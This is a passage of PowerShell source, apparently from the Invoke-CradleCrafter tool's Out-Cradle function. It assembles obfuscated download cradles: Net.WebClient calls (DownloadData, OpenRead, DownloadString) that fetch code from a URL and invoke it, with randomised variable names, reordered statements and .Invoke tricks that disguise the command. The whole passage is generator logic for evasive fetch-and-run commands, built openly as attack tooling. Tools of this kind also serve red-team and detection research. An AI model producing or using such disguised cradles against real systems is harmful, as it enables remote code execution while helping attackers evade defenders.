                        $CommandArray += "$SetVar3'Net.WebClient'"
                        $CommandArray += "$SetVar2'$Url'"

                        If($NewObject.Contains($ModuleAutoLoadTag))
                        {
                            $CurrentModuleAutoLoadRandom = $ModuleAutoLoadRandom
                            If($NewObject.EndsWith('0>>>'))
                            {
                                $CurrentModuleAutoLoadRandom = '<<<0' + $CurrentModuleAutoLoadRandom + '0>>>'
                            }
                        }
                        Else
                        {
                            $CurrentModuleAutoLoadRandom = ''
                        }
                        $CommandArray += $CurrentModuleAutoLoadRandom + $SetVar1 + '(' + $NewObject.Replace($ModuleAutoLoadTag,'') + "$GetVar3)"

                        $CommandArray += "$SetVar4$DownloadData"

                        $SyntaxToInvoke = "$GetVar1.$GetVar4($GetVar2)"
                        $SyntaxToInvoke = $Join.Replace($JoinTag,$Byte.Replace($ByteTag,$SyntaxToInvoke))

                        $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)

                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray += $Command}
                        }
                          
                        # Remove single quotes when DownloadString is used directly as a method instead of a string stored in a variable (as in above command arrangement).
                        While($DownloadData.Contains("'DownloadData'"))
                        {
                            $DownloadData = $DownloadData.Replace("'DownloadData'","DownloadData")
                        }

                        If($DownloadData.EndsWith(')') -OR $DownloadData.EndsWith(')0>>>'))
                        {
                            $DownloadDataInvoke = $DownloadData + '.Invoke'
                        }
                        Else
                        {
                            $DownloadDataInvoke = $DownloadData
                        }

                        # Set alternate command arrangement logic here.
                        $CommandArray2  = @()

                        $CommandArray2 += $CurrentModuleAutoLoadRandom + $SetVar1 + '(' + $NewObject.Replace($ModuleAutoLoadTag,'') + "Net.WebClient)"
                        $CommandArray2 += "$SetVar2'$Url'"

                        $SyntaxToInvoke = "$GetVar1.$DownloadDataInvoke($GetVar2)"
                        $SyntaxToInvoke = $Join.Replace($JoinTag,$Byte.Replace($ByteTag,$SyntaxToInvoke))

                        $CommandArray2 += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)
                          
                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray2 += $Command}
                        }

                        # Set command ordering arrangement logic here.
                        Switch($SwitchRandom_01)
                        {
                            1 {$Syntax = ($CommandArray[$ArrayIndexOrder_01]   + $CommandArray[2,3,4,5] -Join ';')}
                            2 {$Syntax = ($CommandArray2[$Array2IndexOrder_01] + $CommandArray2[2,3]    -Join ';')}
                        }

                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                3 {
                    # Syntax concatenate into logical variable count but random names with obfuscated variable GET/SET syntax.
                      
                    $VarOptionsIndex  = 1
                    $NumberOfVarNames = 4

                    # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                    $VarsUsedInThisBlock  = @()
                    $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex
                      
                    # Set all new variables from above function to current variable context (from script-level to normal-level).
                    For($k=1; $k -le $NumberOfVarNames; $k++)
                    {
                        ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                    }
                      
                    # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                    $DownloadData         = $DownloadData.Replace(        $NewObjectNetWebClientTag,$GetVar1)
                    $DownloadDataWithTags = $DownloadDataWithTags.Replace($NewObjectNetWebClientTag,$GetVar1WithTags)

                    # Encapsulate DownloadData in single quotes if basic syntax is used. Then add .Invoke to GetVar4.
                    If($DownloadData -eq 'DownloadData')
                    {
                        $DownloadDataWithTags = $DownloadDataWithTags.Replace($DownloadData,("'" + $DownloadData + "'"))
                        $DownloadData         = "'" + $DownloadData + "'"
                    }
                      
                    # Add .Invoke to the end of $GetVar4 and $GetVar4WithTags.
                    $GetVar4WithTags = $GetVar4WithTags.Replace($GetVar4,'(' + $GetVar4 + ').Invoke')
                    $GetVar4         = '(' + $GetVar4 + ').Invoke'
                      
                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Command','CommandEscapedString','NewObject','DownloadData','Join','Byte')
                    For($i=1; $i -le 2; $i++)
                    {
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'
                            # Set each 'WithTags' variable values to non-'WithTags' variable names for simplicity.
                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}

                            # Handle embedded tagging.
                            If($Byte.StartsWith('<<<0') -AND $Byte.EndsWith('0>>>'))
                            {
                                $Byte = $Byte.Replace($ByteTag,('0>>>' + $ByteTag + '<<<0'))
                            }
                            If($Join.StartsWith('<<<0') -AND $Join.EndsWith('0>>>'))
                            {
                                $Join = $Join.Replace($JoinTag,('0>>>' + $JoinTag + '<<<0'))
                            }
                        }
                          
                        # Set command arrangement logic here.
                        $CommandArray  = @()
                        $CommandArray += "$SetVar3'Net.WebClient'"
                        $CommandArray += "$SetVar2'$Url'"

                        If($NewObject.Contains($ModuleAutoLoadTag))
                        {
                            $CurrentModuleAutoLoadRandom = $ModuleAutoLoadRandom
                            If($NewObject.EndsWith('0>>>'))
                            {
                                $CurrentModuleAutoLoadRandom = '<<<0' + $CurrentModuleAutoLoadRandom + '0>>>'
                            }
                        }
                        Else
                        {
                            $CurrentModuleAutoLoadRandom = ''
                        }
                        $CommandArray += $CurrentModuleAutoLoadRandom + $SetVar1 + '(' + $NewObject.Replace($ModuleAutoLoadTag,'') + "$GetVar3)"

                        $CommandArray += "$SetVar4$DownloadData"

                        $SyntaxToInvoke = "$GetVar1.$GetVar4($GetVar2)"
                        $SyntaxToInvoke = $Join.Replace($JoinTag,$Byte.Replace($ByteTag,$SyntaxToInvoke))

                        $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)

                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray += $Command}
                        }
    
                        # Add .Invoke to the end of $DownloadData if not default value of 'DownloadData'.
                        If($DownloadData.Contains("'DownloadData'"))
                        {
                            # Remove single quotes when DownloadData is used directly as a method instead of a string stored in a variable (as in above command arrangement).  
                            $DownloadData = $DownloadData.Replace("'DownloadData'","DownloadData")
                        }
                        Else
                        {
                            If($DownloadData.EndsWith('0>>>')) {$DownloadData = $DownloadData.SubString(0,$DownloadData.LastIndexOf('0>>>')) + '.Invoke0>>>'}
                            Else                               {$DownloadData = $DownloadData + '.Invoke'}
                        }
                      
                        # Set alternate command arrangement logic here.
                        $CommandArray2  = @()

                        $CommandArray2 += $CurrentModuleAutoLoadRandom + $SetVar1 + '(' + $NewObject.Replace($ModuleAutoLoadTag,'') + "Net.WebClient)"
                        $CommandArray2 += "$SetVar2'$Url'"

                        $SyntaxToInvoke = "$GetVar1.$DownloadData($GetVar2)"
                        $SyntaxToInvoke = $Join.Replace($JoinTag,$Byte.Replace($ByteTag,$SyntaxToInvoke))

                        $CommandArray2 += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)

                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray2 += $Command}
                        }

                        # Set command ordering arrangement logic here.
                        Switch($SwitchRandom_01)
                        {
                            1 {$Syntax = ($CommandArray[$ArrayIndexOrder_01]   + $CommandArray[2,3,4,5] -Join ';')}
                            2 {$Syntax = ($CommandArray2[$Array2IndexOrder_01] + $CommandArray2[2,3]    -Join ';')}
                        }

                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                default {Write-Error "An invalid `$Rearrange value ($Rearrange) was passed to switch block for Out-Cradle `$Cradle value ($Cradle)."; Exit}
            }

            # Add final cradle syntax (with and without tags) and update token value to $CradleSyntaxOptions to be returned if -ReturnAsArray Switch was specified.
            $CradleSyntaxOptions = @($CradleSyntax,$CradleSyntaxWithTags,$TokenValueUpdatedThisIteration)
        }
        3 {
            #########################################
            ## New-Object Net.WebClient - OpenRead ##
            #########################################

            # Switch block for changing overall syntax arrangement depending on the level passed in with the REARRANGE option.
            # If last option in $TokenArray is ALL then we will choose the highest value for $Rearrange in the below block since each Cradle can have differing numbers of $Rearrange values.
            If($AllOptionSelected) {$Rearrange = 2}
            Switch($Rearrange)
            {
                1 {
                    # Syntax concatenate into logical variable count and names with default variable GET/SET syntax.
                      
                    # Set more logical variable names for this block.
                    $RandomVarName1 = 'wr'  # WebRequest
                    $RandomVarName2 = 'url' # Url
                    $RandomVarName3 = 'wc'  # WebClient (Argument)
                    $RandomVarName4 = 'or'  # OpenRead (Method)
                    $RandomVarName5 = 'sr'  # StreamReader
                    $RandomVarName6 = 'res' # Result

                    $VarOptionsIndex  = 0
                    $NumberOfVarNames = 6

                    # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                    $VarsUsedInThisBlock  = @()
                    $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex

                    # Set all new variables from above function to current variable context (from script-level to normal-level).
                    For($k=1; $k -le $NumberOfVarNames; $k++)
                    {
                        ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                    }
                      
                    # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                    $OpenRead         = $OpenRead.Replace(        $NewObjectNetWebClientTag,$GetVar1)
                    $OpenReadWithTags = $OpenReadWithTags.Replace($NewObjectNetWebClientTag,$GetVar1WithTags)

                    # Extra variables for Stream fringe case. More complicated than it should be but worth it to break out Stream into its own obfuscation type instead of being baked into Rearrange type.
                    $OpenReadForStream         = $OpenRead
                    $OpenReadForStreamWithTags = $OpenReadWithTags

                    # Add .Invoke to $OpenReadForStream.
                    If($OpenReadForStream -ne 'OpenRead')
                    {
                        If($OpenReadForStreamWithTags.EndsWith('0>>>')) {$OpenReadForStreamWithTags = $OpenReadForStreamWithTags.SubString(0,$OpenReadForStreamWithTags.LastIndexOf('0>>>')) + '.Invoke0>>>'}
                        Else                                            {$OpenReadForStreamWithTags = $OpenReadForStreamWithTags + '.Invoke'}
                        $OpenReadForStream = $OpenReadForStream + '.Invoke'
                    }

                    # Encapsulate OpenRead in single quotes if basic syntax is used. Then add .Invoke to GetVar4.
                    If($OpenRead -eq 'OpenRead')
                    {
                        $OpenReadWithTags = $OpenReadWithTags.Replace($OpenRead,("'" + $OpenRead + "'"))
                        $OpenRead         = "'" + $OpenRead + "'"
                    }

                    # Add .Invoke to the end of $GetVar4 and $GetVar4WithTags.
                    $GetVar4WithTags = $GetVar4WithTags.Replace($GetVar4,$GetVar4 + '.Invoke')
                    $GetVar4         = $GetVar4 + '.Invoke'

                    # Add encapsulating parentheses if non-default variable syntax is used.                      
                    If(!$GetVar4.StartsWith('$'))
                    {
                        $GetVar4WithTags = $GetVar4WithTags.Replace($GetVar4,('(' + $GetVar4 + ')'))
                        $GetVar4 = '(' + $GetVar4 + ')'
                    }

                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Command','CommandEscapedString','NewObject','OpenRead','OpenReadForStream','Stream')
                    For($i=1; $i -le 2; $i++)
                    {
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'
                            # Set each 'WithTags' variable values to non-'WithTags' variable names for simplicity.
                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}
                        }

                        $Response = "$GetVar1.$GetVar4($GetVar2)"

                        # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                        $Stream = $Stream.Replace($NewObjectNetWebClientTag,($NewObject + 'Net.WebClient'))
                        $Stream = $Stream.Replace($NewObjectTag,$NewObject)
                        $Stream = $Stream.Replace($OpenReadTag,$OpenReadForStream)
                        $Stream = $Stream.Replace($UrlTag,$Url)
                        $Stream = $Stream.Replace($GetVar1,($NewObject + 'Net.WebClient'))
                        $Stream = $Stream.Replace($ResponseTag,$Response)
                        $Stream = $Stream.Replace($SRSetVarTag,$SetVar5)
                        $Stream = $Stream.Replace($SRGetVarTag,$GetVar5)
                        $Stream = $Stream.Replace($ResultSetVarTag,$SetVar6)
                        $Stream = $Stream.Replace($ResultGetVarTag,$GetVar6)
                        $Stream = $Stream.Replace($WRSetVarTag,$SetVar1)
                        $Stream = $Stream.Replace($WRGetVarTag,$GetVar1)

                        # Set command arrangement logic here.
                        $CommandArray  = @()
                        $CommandArray += "$SetVar3'Net.WebClient'"
                        $CommandArray += "$SetVar2'$Url'"

                        If($NewObject.Contains($ModuleAutoLoadTag))
                        {
                            $CurrentModuleAutoLoadRandom = $ModuleAutoLoadRandom
                            If($NewObject.EndsWith('0>>>'))
                            {
                                $CurrentModuleAutoLoadRandom = '<<<0' + $CurrentModuleAutoLoadRandom + '0>>>'
                            }
                        }
                        Else
                        {
                            $CurrentModuleAutoLoadRandom = ''
                        }
                        $CommandArray += $CurrentModuleAutoLoadRandom + $SetVar1 + '(' + $NewObject.Replace($ModuleAutoLoadTag,'') + "$GetVar3)"

                        $CommandArray += "$SetVar4$OpenRead"

                        # Local-only copy of $ArrayIndexOrder_01 in case Invoke option below needs to update it for Invoke but not update this value being returned to Invoke-CradleCrafter.
                        $ArrayIndexOrder_01_LOCAL = $ArrayIndexOrder_01

                        # SPECIAL CASE: If $Stream is a one-liner (no ';' in $Stream) then replace current $CommandArray with just the $Stream one-liner.
                        If(!$Stream.Contains(';'))
                        {
                            $CommandArray  = @()
                            # Overwrite the ordering of the first two array elements since now there will only be 1-2 elements in $CommandArray.
                            $ArrayIndexOrder_01_LOCAL = @(0,1)
                            $SyntaxToInvoke = $Stream
                        }
                        ElseIf($Stream.Contains('While') -AND $Stream.Contains('Try') -AND $Stream.Contains('Catch'))
                        {
                            $CommandArray += "$SetVar1$GetVar1.$GetVar4($GetVar2)"

                            $CommandArray += $Stream
                            $SyntaxToInvoke = $GetVar6
                        }
                        Else
                        {
                            # Default option.
                            $CommandArray += $Stream
                            $SyntaxToInvoke = $GetVar6
                        }

                        $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)

                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray += $Command}
                        }

                        # Add .Invoke to the end of $OpenRead if not default value of 'OpenRead'.
                        If($OpenRead.Contains("'OpenRead'"))
                        {
                            # Remove single quotes when OpenRead is used directly as a method instead of a string stored in a variable (as in above command arrangement).  
                            $OpenRead = $OpenRead.Replace("'OpenRead'","OpenRead")
                        }
                        Else
                        {
                            If($OpenRead.EndsWith('0>>>')) {$OpenRead = $OpenRead.SubString(0,$OpenRead.LastIndexOf('0>>>')) + '.Invoke0>>>'}
                            Else                           {$OpenRead = $OpenRead + '.Invoke'}
                        }
                      
                        # Set alternate command arrangement logic here.
                        $CommandArray2  = @()

                        $CommandArray2 += $CurrentModuleAutoLoadRandom + $SetVar1 + '(' + $NewObject.Replace($ModuleAutoLoadTag,'') + "Net.WebClient)"
                        $CommandArray2 += "$SetVar2'$Url'"

                        # Local-only copy of $Array2IndexOrder_01 in case Invoke option below needs to update it for Invoke but not update this value being returned to Invoke-CradleCrafter.
                        $Array2IndexOrder_01_LOCAL = $Array2IndexOrder_01

                        # SPECIAL CASE: If $Stream is a one-liner (no ';' in $Stream) then replace current $CommandArray with just the $Stream one-liner.
                        If(!$Stream.Contains(';'))
                        {
                            $CommandArray2  = @()
                            # Overwrite the ordering of the first two array elements since now there will only be 1-2 elements in $CommandArray2.
                            $Array2IndexOrder_01_LOCAL = @(0,1)
                            $SyntaxToInvoke = $Stream
                        }
                        ElseIf($Stream.Contains('While') -AND $Stream.Contains('Try') -AND $Stream.Contains('Catch'))
                        {
                            $CommandArray2 += "$SetVar1$GetVar1.$OpenRead($GetVar2)"
                            $CommandArray2 += $Stream
                            $SyntaxToInvoke = $GetVar6
                        }
                        Else
                        {
                            # Default option.
                            $CommandArray2 += $Stream.Replace($GetVar4,$OpenRead)
                            $SyntaxToInvoke = $GetVar6
                        }

                        $CommandArray2 += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)

                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray2 += $Command}
                        }

                        # Set command ordering arrangement logic here.
                        Switch($SwitchRandom_01)
                        {
                            1 {$Syntax = ($CommandArray[$ArrayIndexOrder_01_LOCAL]   + $CommandArray[2,3,4,5,6,7] -Join ';')}
                            2 {$Syntax = ($CommandArray2[$Array2IndexOrder_01_LOCAL] + $CommandArray2[2,3,4,5]    -Join ';')}
                        }

                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                2 {
                    # Syntax concatenate into logical variable count but random names with obfuscated variable GET/SET syntax.
                      
                    $VarOptionsIndex  = 1
                    $NumberOfVarNames = 6

                    # Since we may have += syntax if Stream option 3 is chosen, we keep getting randomized GET/SET variable syntax until $GetVar6 is an acceptable syntax.
                    # (Get-Variable VARNAME).Value+= is acceptable, but errors occur when the syntax is (Get-Variable VARNAME -ValueOnly)+=
                    Do
                    {
                        # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                        $VarsUsedInThisBlock  = @()
                        $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex

                        # Set all new variables from above function to current variable context (from script-level to normal-level).
                        For($k=1; $k -le $NumberOfVarNames; $k++)
                        {
                            ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                        }
                    }
                    Until(!$GetVar6.Contains(' -V'))

                    # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                    $OpenRead         = $OpenRead.Replace(        $NewObjectNetWebClientTag,$GetVar1)
                    $OpenReadWithTags = $OpenReadWithTags.Replace($NewObjectNetWebClientTag,$GetVar1WithTags)

                    # Extra variables for Stream fringe case. More complicated than it should be but worth it to break out Stream into its own obfuscation type instead of being baked into Rearrange type.
                    $OpenReadForStream         = $OpenRead
                    $OpenReadForStreamWithTags = $OpenReadWithTags

                    # Add .Invoke to $OpenReadForStream.
                    If($OpenReadForStream -ne 'OpenRead')
                    {
                        If($OpenReadForStreamWithTags.EndsWith('0>>>')) {$OpenReadForStreamWithTags = $OpenReadForStreamWithTags.SubString(0,$OpenReadForStreamWithTags.LastIndexOf('0>>>')) + '.Invoke0>>>'}
                        Else                                            {$OpenReadForStreamWithTags = $OpenReadForStreamWithTags + '.Invoke'}
                        $OpenReadForStream = $OpenReadForStream + '.Invoke'
                    }

                    # Encapsulate OpenRead in single quotes if basic syntax is used. Then add .Invoke to GetVar4.
                    If($OpenRead -eq 'OpenRead')
                    {
                        $OpenReadWithTags = $OpenReadWithTags.Replace($OpenRead,("'" + $OpenRead + "'"))
                        $OpenRead         = "'" + $OpenRead + "'"
                    }

                    # Add .Invoke to the end of $GetVar4 and $GetVar4WithTags.
                    $GetVar4WithTags = $GetVar4WithTags.Replace($GetVar4,$GetVar4 + '.Invoke')
                    $GetVar4         = $GetVar4 + '.Invoke'

                    # Add encapsulating parentheses if non-default variable syntax is used.                      
                    If(!$GetVar4.StartsWith('$'))
                    {
                        $GetVar4WithTags = $GetVar4WithTags.Replace($GetVar4,('(' + $GetVar4.Replace('.Invoke',').Invoke')))
                        $GetVar4 = '(' + $GetVar4.Replace('.Invoke',').Invoke')
                    }

                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Command','CommandEscapedString','NewObject','OpenRead','OpenReadForStream','Stream')
                    For($i=1; $i -le 2; $i++)
                    {
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'
                            # Set each 'WithTags' variable values to non-'WithTags' variable names for simplicity.
                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}
                        }

                        $Response = "$GetVar1.$GetVar4($GetVar2)"

                        # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                        $Stream = $Stream.Replace($NewObjectNetWebClientTag,($NewObject + 'Net.WebClient'))
                        $Stream = $Stream.Replace($NewObjectTag,$NewObject)
                        $Stream = $Stream.Replace($OpenReadTag,$OpenReadForStream)
                        $Stream = $Stream.Replace($UrlTag,$Url)
                        $Stream = $Stream.Replace($GetVar1,($NewObject + 'Net.WebClient'))
                        If($SetVar5.Contains(' '))
                        {
                            # Add extra parenthese for SetVar5 if it is a Set-Variable syntax (i.e. with whitespaces).
                            $Stream = $Stream.Replace($ResponseTag,($Response + ')'))
                            $Stream = $Stream.Replace($SRSetVarTag,($SetVar5 + '('))
                        }
                        Else
                        {
                            $Stream = $Stream.Replace($ResponseTag,$Response)
                            $Stream = $Stream.Replace($SRSetVarTag,$SetVar5)
                        }
                        $Stream = $Stream.Replace($SRGetVarTag,$GetVar5)
                        $Stream = $Stream.Replace($ResultSetVarTag,$SetVar6)
                        $Stream = $Stream.Replace($ResultGetVarTag,$GetVar6)
                        $Stream = $Stream.Replace($WRSetVarTag,$SetVar1)
                        $Stream = $Stream.Replace($WRGetVarTag,$GetVar1)

                        # Set command arrangement logic here.
                        $CommandArray  = @()
                        $CommandArray += "$SetVar3'Net.WebClient'"
                        $CommandArray += "$SetVar2'$Url'"

                        If($NewObject.Contains($ModuleAutoLoadTag))
                        {
                            $CurrentModuleAutoLoadRandom = $ModuleAutoLoadRandom
                            If($NewObject.EndsWith('0>>>'))
                            {
                                $CurrentModuleAutoLoadRandom = '<<<0' + $CurrentModuleAutoLoadRandom + '0>>>'
                            }
                        }
                        Else
                        {
                            $CurrentModuleAutoLoadRandom = ''
                        }
                        $CommandArray += $CurrentModuleAutoLoadRandom + $SetVar1 + '(' + $NewObject.Replace($ModuleAutoLoadTag,'') + "$GetVar3)"
                          
                        $CommandArray += "$SetVar4$OpenRead"

                        # Local-only copy of $ArrayIndexOrder_01 in case Invoke option below needs to update it for Invoke but not update this value being returned to Invoke-CradleCrafter.
                        $ArrayIndexOrder_01_LOCAL = $ArrayIndexOrder_01

                        # SPECIAL CASE: If $Stream is a one-liner (no ';' in $Stream) then replace current $CommandArray with just the $Stream one-liner.
                        If(!$Stream.Contains(';'))
                        {
                            $CommandArray  = @()
                            # Overwrite the ordering of the first two array elements since now there will only be 1-2 elements in $CommandArray.
                            $ArrayIndexOrder_01_LOCAL = @(0,1)
                            $SyntaxToInvoke = $Stream
                        }
                        ElseIf($Stream.Contains('While') -AND $Stream.Contains('Try') -AND $Stream.Contains('Catch'))
                        {
                            $CommandArray += "$SetVar1$GetVar1.$GetVar4($GetVar2)"
                            $CommandArray += $Stream
                            $SyntaxToInvoke = $GetVar6
                        }
                        Else
                        {
                            # Default option.
                            $CommandArray += $Stream
                            $SyntaxToInvoke = $GetVar6
                        }

                        $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)

                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray += $Command}
                        }

                        # Add .Invoke to the end of $OpenRead if not default value of 'OpenRead'.
                        If($OpenRead.Contains("'OpenRead'"))
                        {
                            # Remove single quotes when OpenRead is used directly as a method instead of a string stored in a variable (as in above command arrangement).  
                            $OpenRead = $OpenRead.Replace("'OpenRead'","OpenRead")
                        }
                        Else
                        {
                            If($OpenRead.EndsWith('0>>>')) {$OpenRead = $OpenRead.SubString(0,$OpenRead.LastIndexOf('0>>>')) + '.Invoke0>>>'}
                            Else                           {$OpenRead = $OpenRead + '.Invoke'}
                        }
                      
                        # Set alternate command arrangement logic here.
                        $CommandArray2  = @()

                        $CommandArray2 += $CurrentModuleAutoLoadRandom + $SetVar1 + '(' + $NewObject.Replace($ModuleAutoLoadTag,'') + "Net.WebClient)"
                        $CommandArray2 += "$SetVar2'$Url'"

                        # Local-only copy of $ArrayIndexOrder_01 in case Invoke option below needs to update it for Invoke but not update this value being returned to Invoke-CradleCrafter.
                        $Array2IndexOrder_01_LOCAL = $Array2IndexOrder_01

                        # SPECIAL CASE: If $Stream is a one-liner (no ';' in $Stream) then replace current $CommandArray with just the $Stream one-liner.
                        If(!$Stream.Contains(';'))
                        {
                            $CommandArray2  = @()
                            # Overwrite the ordering of the first two array elements since now there will only be 1-2 elements in $CommandArray2.
                            $Array2IndexOrder_01_LOCAL = @(0,1)
                            $SyntaxToInvoke = $Stream
                        }
                        ElseIf($Stream.Contains('While') -AND $Stream.Contains('Try') -AND $Stream.Contains('Catch'))
                        {
                            $CommandArray2 += "$SetVar1$GetVar1.$OpenRead($GetVar2)"
                            $CommandArray2 += $Stream
                            $SyntaxToInvoke = $GetVar6
                        }
                        Else
                        {
                            # Default option.
                            $CommandArray2 += $Stream.Replace($GetVar4,$OpenRead)
                            $SyntaxToInvoke = $GetVar6
                        }

                        $CommandArray2 += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)

                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray2 += $Command}
                        }

                        # Set command ordering arrangement logic here.
                        Switch($SwitchRandom_01)
                        {
                            1 {$Syntax = ($CommandArray[$ArrayIndexOrder_01_LOCAL]   + $CommandArray[2,3,4,5,6,7] -Join ';')}
                            2 {$Syntax = ($CommandArray2[$Array2IndexOrder_01_LOCAL] + $CommandArray2[2,3,4,5]    -Join ';')}
                        }

                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                default {Write-Error "An invalid `$Rearrange value ($Rearrange) was passed to switch block for Out-Cradle `$Cradle value ($Cradle)."; Exit}
            }

            # Add final cradle syntax (with and without tags) and update token value to $CradleSyntaxOptions to be returned if -ReturnAsArray Switch was specified.
            $CradleSyntaxOptions = @($CradleSyntax,$CradleSyntaxWithTags,$TokenValueUpdatedThisIteration)
        }
        4 {
            ####################################################
            ## [Net.WebClient]::New - DownloadString - PS3.0+ ##
            ####################################################

            # Switch block for changing overall syntax arrangement depending on the level passed in with the REARRANGE option.
            # If last option in $TokenArray is ALL then we will choose the highest value for $Rearrange in the below block since each Cradle can have differing numbers of $Rearrange values.
            If($AllOptionSelected) {$Rearrange = 3}
            Switch($Rearrange)
            {
                1 {
                    # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                    $DownloadString         = $DownloadString.Replace(        $NewObjectNetWebClientTag,"$NetWebClient::New()")
                    $DownloadStringWithTags = $DownloadStringWithTags.Replace($NewObjectNetWebClientTag,"$NetWebClientWithTags::New()")

                    $SyntaxToInvoke         = "$NetWebClient::New().$DownloadString('$Url')"
                    $SyntaxToInvokeWithTags = "$NetWebClientWithTags::New().$DownloadStringWithTags('$UrlWithTags')"

                    If(($Invoke.Contains($CommandTag) -AND $InvokeWithTags.Contains($CommandTag)) -OR ($Invoke.Contains($CommandEscapedStringTag) -AND $InvokeWithTags.Contains($CommandEscapedStringTag)))
                    {
                        $CradleSyntax         = $Invoke.Replace($InvokeTag,"($SyntaxToInvoke)").Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)
                        $CradleSyntaxWithTags = $InvokeWithTags.Replace($InvokeTag,"($SyntaxToInvokeWithTags)").Replace($CommandTag, $CommandWithTags).Replace($CommandEscapedStringTag,$CommandEscapedString)
                    }
                    Else
                    {
                        If($Command) {$Command = ';' + $Command; $CommandWithTags = ';' + $CommandWithTags}
                        $CradleSyntax         = $Invoke.Replace($InvokeTag,"($SyntaxToInvoke)") + $Command
                        $CradleSyntaxWithTags = $InvokeWithTags.Replace($InvokeTag,"($SyntaxToInvokeWithTags)") + $CommandWithTags
                    }

                    # Remove .Invoke methods since this cradle is PS3.0+ and .Invoke is not needed in PS3.0+.
                    $CradleSyntax         = $CradleSyntax.Replace(        '.Invoke()','<SCRIPTBLOCKINVOKETAG>').Replace('.Invoke(','(').Replace('<SCRIPTBLOCKINVOKETAG>','.Invoke()')
                    $CradleSyntaxWithTags = $CradleSyntaxWithTags.Replace('.Invoke()','<SCRIPTBLOCKINVOKETAG>').Replace('.Invoke(','(').Replace('<SCRIPTBLOCKINVOKETAG>','.Invoke()')
                }
                2 {
                    # Syntax concatenate into logical variable count and names with default variable GET/SET syntax.
                      
                    # Set more logical variable names for this block.
                    $RandomVarName1 = 'wc'  # WebClient
                    $RandomVarName2 = 'url' # Url
                    $RandomVarName4 = 'ds'  # DownloadString (Method)

                    $VarOptionsIndex  = 0
                    $NumberOfVarNames = 3

